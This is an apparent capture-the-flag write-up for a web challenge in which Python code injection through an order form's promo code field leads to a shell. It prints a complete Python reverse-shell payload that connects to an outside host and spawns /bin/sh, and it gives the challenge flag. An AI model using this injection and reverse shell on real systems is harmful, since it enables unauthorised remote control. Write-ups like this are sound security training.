*g0dmode's Pizza Shop* üçï was a task labelled web and worth 300 points. It is
a standard Python command injection. I felt like it was worth way too much
points for the difficulty.

As always, quick nmap scan:

```
$ nmap 3.9.188.161

We have a web application on port 80:

The challenge description makes it clear that we have to inject some command
into the promo code field of the order page. We can totally ignore the
account mechanism.

Let's try with a very simple payload: a single quote `'`. We get back an error:

The error looks like a Python quote parsing issue. My guess is that the backend
looks something like:

```
promo_code = ord('<USER_INPUT>')
```

If my guess is correct, the payload `') #` should produce no error, as we just
complete the function call and transform the end of the line into a comment
like so:

```python
promo_code = ord('') #')
```

My guess turned to be correct. So I decided to inject some reverse shell
payload. A friend told me to take a look at
[this website](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

Let's tweak their Python payload a little bit:

```python
'); import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("geographer.fr",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]); #
```

We get a root shell immediately:

Final flag: `dctf{python_code_injection_via_unsafe_exec_call_oops1e}`.
